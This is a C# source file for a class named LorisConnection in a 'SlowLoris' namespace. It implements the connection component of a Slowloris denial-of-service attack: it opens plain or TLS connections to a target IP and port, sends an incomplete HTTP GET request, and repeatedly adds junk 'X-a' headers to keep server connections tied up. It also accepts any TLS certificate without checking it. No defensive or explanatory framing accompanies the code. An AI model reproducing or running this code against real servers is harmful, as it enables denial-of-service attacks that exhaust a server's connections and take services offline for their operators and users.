using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace SlowLoris
{
    public class LorisConnection
    {
        private static Random rnd = new Random();

        public string IP { get; private set; }
        public int Port { get; private set; }
        public bool UsingSsl { get; private set; }

        private StreamWriter writer;

        public LorisConnection(string ip, int port, bool useSsl)
        {
            IP = ip;
            Port = port;
            UsingSsl = useSsl;

            TcpClient client = new TcpClient(ip, port);
            if (UsingSsl)
            {
                SslStream ssl = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateCert));
                writer = new StreamWriter(ssl);
            }
            else
                writer = new StreamWriter(client.GetStream());
            writer.AutoFlush = true;
        }

        public void SendHeaders(string userAgent)
        {
            writer.WriteLine(string.Format("GET /?{0} HTTP/1.1\r\n", rnd.Next(0, 2000)));
            writer.WriteLine(string.Format("{0}\r\n", userAgent));
            writer.WriteLine("Accept-language: en-US,en,q=0.5\r\n");
        }

        public void KeepAlive()
        {
            writer.WriteLine(string.Format("X-a: {0}\r\n", rnd.Next(1, 5000)));
        }

        public static bool ValidateCert(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true; // Allow untrusted certificates.
        }
    }
}

